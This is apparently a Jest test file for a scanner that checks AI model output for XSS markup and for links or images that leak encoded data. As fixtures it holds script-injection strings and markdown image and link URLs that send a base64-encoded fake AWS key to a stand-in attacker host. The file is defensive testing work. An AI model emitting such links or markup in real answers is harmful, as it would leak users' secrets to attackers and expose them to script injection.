/** @jest-environment node */
import { scanModelOutput, findUrlPayloads, looksEncoded, hostAllowed } from "../output-safety";

describe("scanModelOutput (LLM02 insecure output handling)", () => {
  it("flags active/executable content in model prose", () => {
    expect(scanModelOutput('Here you go: <script>steal()</script>').map((r) => r.kind)).toContain("script_tag");
    expect(scanModelOutput('<iframe src=evil></iframe>').map((r) => r.kind)).toContain("iframe_embed");
    expect(scanModelOutput('Click <a href="javascript:doEvil()">here</a>').map((r) => r.kind)).toContain("js_uri");
    expect(scanModelOutput('<img src=x onerror=alert(1)>').map((r) => r.kind)).toContain("event_handler");
    expect(scanModelOutput('open data:text/html,<script>x</script>').map((r) => r.kind)).toContain("data_html");
  });

  it("does NOT flag a code EXAMPLE inside fenced or inline code", () => {
    expect(scanModelOutput("To add a script tag, write:\n```html\n<script src=app.js></script>\n```")).toEqual([]);
    expect(scanModelOutput("The `<script>` tag loads JavaScript.")).toEqual([]);
  });

  it("returns nothing for safe plain output", () => {
    expect(scanModelOutput("Your three tasks are due Friday. Want me to reschedule?")).toEqual([]);
    expect(scanModelOutput("")).toEqual([]);
  });
});

describe("external_url_payload (data leaving through a link or image)", () => {
  const key = Buffer.from("AKIAFAKEKEY1234567890:wJalrXUtnFEMI/K7MDENG/bPxRfiCYFAKE").toString("base64");
  const hex = "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08";
  const kinds = (t: string, allowedHosts: string[] = []) => scanModelOutput(t, { allowedHosts }).map((r) => r.kind);

  describe("true positives", () => {
    it.each([
      ["a markdown image with a base64 query", `![x](https://evil.example/p?d=${key})`],
      ["a markdown link with a base64 query", `[click](https://evil.example/c?q=${key})`],
      ["a base64url path segment", `![](https://evil.example/i/${key.replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "")}.png)`],
      ["a hex payload in the path", `see https://evil.example/${hex}`],
      ["a payload in the fragment", `https://evil.example/page#${key}`],
      ["percent-encoded bytes", `https://evil.example/x?b=${"%00%ff%10%9a%7f%c3%28%a0%a1".repeat(4)}`],
      ["an HTML img tag", `<img src="https://evil.example/p.gif?d=${key}">`],
      ["a bare URL in prose", `Here is your summary https://evil.example/collect?payload=${key} thanks`],
    ])("%s", (_label, text) => {
      expect(kinds(text)).toContain("external_url_payload");
    });

    it("a subdomain of an allowlisted host is still allowed, a lookalike is not", () => {
      expect(kinds(`https://docs.example.com/x?d=${key}`, ["example.com"])).not.toContain("external_url_payload");
      expect(kinds(`https://example.com.evil.example/x?d=${key}`, ["example.com"])).toContain("external_url_payload");
    });
  });

  describe("true negatives", () => {
    it.each([
      ["an in-app route", "Open [your goals](/goals) to update them."],
      ["a docs slug", "Read https://learn.microsoft.com/en-us/entra/identity/authentication/how-to-reset-your-password-in-outlook-and-teams"],
      ["a UUID record id", "https://crm.example/records/550e8400-e29b-41d4-a716-446655440000"],
      ["short query values", "https://news.example/article?id=12345&page=2&utm_source=newsletter"],
      ["a search query in words", "https://search.example/?q=how+to+export+calendar+to+excel+in+outlook"],
      ["a payload URL inside a fenced code example", "```\nfetch('https://evil.example/p?d=" + key + "')\n```"],
      ["plain prose", "Your three tasks are due Friday."],
    ])("%s", (_label, text) => {
      expect(kinds(text)).not.toContain("external_url_payload");
    });

    it("an allowlisted host may carry an id", () => {
      expect(kinds(`https://github.com/org/repo/commit/${hex.slice(0, 40)}`, ["github.com"])).toEqual([]);
    });
  });

  it("helpers: looksEncoded / hostAllowed / findUrlPayloads", () => {
    expect(looksEncoded(key)).toBe(true);
    expect(looksEncoded("how-to-reset-your-password-in-outlook")).toBe(false);
    expect(hostAllowed("a.b.example.com", ["example.com"])).toBe(true);
    expect(hostAllowed("notexample.com", ["example.com"])).toBe(false);
    expect(findUrlPayloads(`x https://evil.example/?d=${key} y`)).toHaveLength(1);
  });
});

describe("external_url_payload: non-ASCII text is not binary", () => {
  it("a query in Japanese is not flagged", () => {
    const q = encodeURIComponent("会議の議事録をエクスポートする方法を教えてください会議の議事録");
    expect(scanModelOutput(`https://search.example/?q=${q}`).map((r) => r.kind)).not.toContain("external_url_payload");
  });
});
